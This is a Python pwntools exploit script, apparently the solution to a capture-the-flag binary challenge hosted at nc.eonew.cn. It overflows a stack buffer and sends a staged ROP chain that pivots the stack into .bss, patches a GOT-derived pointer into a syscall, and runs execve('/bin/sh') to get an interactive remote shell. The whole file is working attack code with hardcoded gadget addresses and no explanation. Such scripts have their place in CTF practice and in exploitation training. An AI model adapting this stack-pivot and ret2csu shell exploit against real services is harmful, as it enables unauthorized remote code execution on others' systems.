from pwn import *

###Addr
#  libc2.27
bss = 0x601000
start = 0x400450+6  #skip pop rsi
main = 0x400537
read_plt = 0x400440
read_got = 0x600fe8
libc_start_got = 0x600ff0
libc_start_offset = 0x21ab0
syscall_offset = 0x21be4

###ROPgadget
pop_rdi = 0x4005d3
pop_rsi_r15 = 0x4005d1
pop_rbp = 0x4004b8
leave = 0x400564
set_param = 0x4005ca
call_func = 0x4005b0
modify_val = 0x400518   #add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret

###Exploit
r = remote('nc.eonew.cn',10002)

padding = b'a'*0x88
ROPchain = p64(pop_rdi)+p64(0)+\
           p64(pop_rsi_r15)+p64(bss+0x800)+p64(0)+\
           p64(read_plt)+\
           p64(pop_rbp)+p64(bss+0x800-8)+\
           p64(leave)
payload = (padding+ROPchain).ljust(0x100,b'\x00')
r.send(payload)

ROPchain = p64(set_param)+p64(0)+p64(1)+p64(libc_start_got)+p64(start)+p64(0)+p64(0)+\
           p64(call_func)
payload = ROPchain.ljust(0x100,b'\x00')
r.send(payload)

padding = b'a'*0x88
ROPchain = p64(pop_rdi)+p64(0)+\
           p64(pop_rsi_r15)+p64(bss+0x800)+p64(0)+\
           p64(read_plt)+\
           p64(pop_rbp)+p64(bss+0x800-8)+\
           p64(leave)
payload = (padding+ROPchain).ljust(0x100,b'\x00')
r.send(payload)

ROPchain = p64(set_param)+p64(syscall_offset-libc_start_offset-231)+p64(bss+0x778+0x3d)+p64(0)+p64(0)+p64(0)+p64(0)+\
           p64(modify_val)+\
           p64(set_param)+p64(0)+p64(1)+p64(read_got)+p64(0)+p64(bss)+p64(0x3b)+\
           p64(call_func)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+\
           p64(set_param)+p64(0)+p64(1)+p64(bss+0x778)+p64(bss+0x800+0xf8)+p64(0)+p64(0)+\
           p64(call_func)
argument = b'/bin/sh\x00'
payload = (ROPchain+argument).ljust(0x100,b'\x00')
r.send(payload)
r.send('a'*0x3b)

r.interactive()
